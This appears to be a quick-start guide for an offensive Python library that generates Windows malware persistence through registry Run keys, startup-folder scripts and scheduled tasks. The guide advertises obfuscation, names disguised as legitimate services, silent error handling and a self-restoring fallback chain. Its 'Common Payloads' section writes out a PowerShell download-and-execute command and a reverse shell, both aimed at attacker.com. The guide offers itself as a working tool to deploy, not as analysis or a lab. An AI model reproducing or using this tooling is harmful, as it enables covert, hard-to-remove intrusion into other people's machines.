# Advanced Persistence Quick Start Guide

## Installation

```python
from advanced_persistence_multimethods import (
    MultiMethodPersistence, PersistenceConfig, RegistryHive,
    ScheduledTaskTrigger
)
```

## Basic Usage (30 seconds)

### Minimal Configuration
```python
config = PersistenceConfig(payload="calc.exe")
persistence = MultiMethodPersistence(config)
payloads = persistence.generate_all_persistence_methods()
```

### View Summary
```python
print(persistence.get_deployment_summary())
```

## Common Configurations

### 1. Registry Only (Fast, No Admin Required)
```python
config = PersistenceConfig(
    payload="notepad.exe",
    use_startup_folder=False,
    use_scheduled_task=False,
    registry_hives=[RegistryHive.HKCU]
)
persistence = MultiMethodPersistence(config)
registry_payloads = persistence.generate_registry_persistence()
```

### 2. Registry + Startup (Standard)
```python
config = PersistenceConfig(
    payload="cmd.exe /c ipconfig",
    use_scheduled_task=False
)
persistence = MultiMethodPersistence(config)
payloads = persistence.generate_all_persistence_methods()
```

### 3. All Methods (Maximum Redundancy)
```python
config = PersistenceConfig(
    payload="powershell.exe -NoProfile -WindowStyle Hidden -Command 'Get-Process'",
    obfuscation_level="extreme",
    registry_hives=[RegistryHive.HKCU, RegistryHive.HKLM],
    use_startup_folder=True,
    use_scheduled_task=True,
    enable_fallback_chain=True,
    randomize_names=True
)
persistence = MultiMethodPersistence(config)
all_payloads = persistence.generate_all_persistence_methods()
```

## Key Methods

### Generate Specific Persistence Methods

```python
# Registry persistence
registry_payloads = persistence.generate_registry_persistence()

# Startup folder persistence
startup_payloads = persistence.generate_startup_persistence()

# Scheduled task persistence
task_payloads = persistence.generate_scheduled_task_persistence()

# Fallback chain
fallback_payloads = persistence.generate_fallback_chain()

# All methods
all_payloads = persistence.generate_all_persistence_methods()
```

### Get Information

```python
# Summary of all payloads
summary = persistence.get_deployment_summary()
print(summary)

# Individual payload code
for key, code in persistence.generated_code.items():
    print(f"{key}: {len(code)} characters")
```

## Configuration Parameters

| Parameter | Type | Default | Purpose |
|-----------|------|---------|---------|
| `payload` | str | Required | Command/executable to run |
| `obfuscation_enabled` | bool | True | Enable payload encoding |
| `obfuscation_level` | str | "high" | low/medium/high/extreme |
| `registry_hives` | List | [HKCU, HKLM] | Hives to use |
| `registry_paths` | List | [3 paths] | Registry locations |
| `use_startup_folder` | bool | True | Enable startup persistence |
| `startup_extensions` | List | [.vbs, .bat, .ps1] | File formats |
| `use_scheduled_task` | bool | True | Enable scheduled tasks |
| `task_triggers` | List | [LOGON, STARTUP] | Task trigger types |
| `enable_fallback_chain` | bool | True | Enable recovery mechanism |
| `randomize_names` | bool | True | Randomize naming |

## Registry Hives

```python
from advanced_persistence_multimethods import RegistryHive

RegistryHive.HKCU  # Current user (no admin required)
RegistryHive.HKLM  # Local machine (admin required)
RegistryHive.HKCC  # Current configuration
RegistryHive.HKU   # All users
RegistryHive.HKCR  # Classes root
```

## Scheduled Task Triggers

```python
from advanced_persistence_multimethods import ScheduledTaskTrigger

ScheduledTaskTrigger.LOGON      # On user logon
ScheduledTaskTrigger.STARTUP    # On system startup
ScheduledTaskTrigger.IDLE       # When system idle
ScheduledTaskTrigger.INTERVAL   # At regular interval
ScheduledTaskTrigger.DAILY      # Daily at specific time
ScheduledTaskTrigger.WEEKLY     # Weekly
ScheduledTaskTrigger.ONCONNECT  # On network connect
```

## Output Examples

### Registry Persistence Output
```
' Registry Persistence Module - HKCU
On Error Resume Next
Dim regPath, regValue, objReg, strCommand
regPath = "Software\Microsoft\Windows\CurrentVersion\Run"
regValue = "WindowsUpdate"
Set objReg = GetObject("winmgmts:").ExecMethod("Win32_Process", "Create")
...
```

### Startup Folder VBS Output
```
' Startup Folder Persistence Script
On Error Resume Next
Dim fso, shell, startupPath, scriptPath, objWMI, objProcess
Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")
startupPath = shell.SpecialFolders("Startup")
...
```

### Scheduled Task PowerShell Output
```powershell
$ErrorActionPreference = "SilentlyContinue"
$xmlBase64 = "..."
$xmlBytes = [System.Convert]::FromBase64String($xmlBase64)
$xmlString = [System.Text.Encoding]::Unicode.GetString($xmlBytes)
Register-ScheduledTask -Xml $xmlString -TaskName "WindowsMaintenanceTask" -Force
...
```

## Running Tests

```bash
# Run all tests
python3 test_advanced_persistence.py

# Expected output
Ran 41 tests in 0.004s
OK
```

## Running Examples

```bash
# Run all examples
python3 advanced_persistence_examples.py

# Shows 10 comprehensive examples
# Example 1: Basic registry persistence
# Example 2: Startup folder with all formats
# Example 3: Scheduled task with multiple triggers
# ...
```

## Deployment Workflow

### Step 1: Create Configuration
```python
config = PersistenceConfig(payload="your_payload")
```

### Step 2: Initialize System
```python
persistence = MultiMethodPersistence(config)
```

### Step 3: Generate Payloads
```python
all_payloads = persistence.generate_all_persistence_methods()
```

### Step 4: View Summary
```python
print(persistence.get_deployment_summary())
```

### Step 5: Extract and Deploy
```python
for method_type, payloads in all_payloads.items():
    for key, code in payloads.items():
        # Save or execute payload
        with open(f"{key}.vbs", "w") as f:
            f.write(code)
```

## Redundancy Summary

| Configuration | Registry | Startup | Scheduled Task | Total Points |
|---------------|----------|---------|----------------|--------------|
| Minimal | 3 | 0 | 0 | 3 |
| Standard | 3 | 3 | 0 | 6 |
| Full | 6 | 3 | 3 | 12+ |
| Maximum | 9+ | 3 | 3 | 15+ |

## Evasion Techniques

✓ Payload obfuscation (base64/hex encoding)
✓ Multiple persistence methods
✓ Randomized naming (appear as legitimate services)
✓ Fallback chain (automatic recovery)
✓ Error suppression (silent operation)
✓ Multiple registry hives and paths
✓ Startup folder with file disguise
✓ Scheduled tasks with multiple triggers

## Common Payloads

```python
# Execute command
config = PersistenceConfig(payload="cmd.exe /c whoami")

# PowerShell command
config = PersistenceConfig(
    payload="powershell.exe -NoProfile -WindowStyle Hidden -Command 'Get-Process'"
)

# Launch executable
config = PersistenceConfig(payload="C:\\Windows\\System32\\notepad.exe")

# Download and execute
config = PersistenceConfig(
    payload="powershell.exe -Command 'IEX(New-Object Net.WebClient).DownloadString(\"http://attacker.com/script.ps1\")'"
)

# Reverse shell
config = PersistenceConfig(
    payload="powershell.exe -NoProfile -WindowStyle Hidden -Command '$client=New-Object Net.Sockets.TcpClient(\"attacker.com\",4444);...'"
)
```

## Troubleshooting

### "At least one persistence method must be enabled"
Ensure at least one of these is True:
- `registry_hives` (not empty)
- `use_startup_folder`
- `use_scheduled_task`
- `enable_fallback_chain`

### "Payload cannot be empty"
Ensure `payload` parameter is not empty:
```python
config = PersistenceConfig(payload="calc.exe")  # ✓ Good
config = PersistenceConfig(payload="")          # ✗ Bad
```

### "Invalid obfuscation level"
Use valid levels:
```python
obfuscation_level="low"      # ✓ Valid
obfuscation_level="medium"   # ✓ Valid
obfuscation_level="high"     # ✓ Valid
obfuscation_level="extreme"  # ✓ Valid
obfuscation_level="custom"   # ✗ Invalid
```

## Performance Tips

1. **Minimal Configuration**
   - Use only registry for fastest generation
   - Disable randomization for performance
   - Example: 1ms generation time

2. **Standard Configuration**
   - Registry + Startup for good balance
   - Enable randomization for stealth
   - Example: 3ms generation time

3. **Maximum Configuration**
   - All methods enabled for maximum redundancy
   - Full obfuscation and randomization
   - Example: 5-10ms generation time

## Next Steps

1. **Read Documentation**
   - See `ADVANCED_PERSISTENCE_DOCUMENTATION.md` for details

2. **Review Examples**
   - Run `python3 advanced_persistence_examples.py`

3. **Run Tests**
   - Run `python3 test_advanced_persistence.py`

4. **Customize Configuration**
   - Modify parameters for your specific needs

5. **Deploy Payloads**
   - Extract and execute generated code

## Support

For questions or issues:
1. Check ADVANCED_PERSISTENCE_DOCUMENTATION.md
2. Review advanced_persistence_examples.py
3. Look at test_advanced_persistence.py for usage patterns
4. Check advanced_persistence_multimethods.py source code

---

**Quick Summary:**
- Registry (HKCU/HKLM) - User/System logon persistence
- Startup Folder (VBS/Batch/PowerShell) - User session persistence
- Scheduled Tasks (Multiple triggers) - System-level persistence
- Fallback Chain - Automatic recovery and re-deployment
- Maximum Redundancy = Multiple methods at multiple points

**Result:** Extreme persistence difficulty to remove (requires 100% cleanup of all methods)
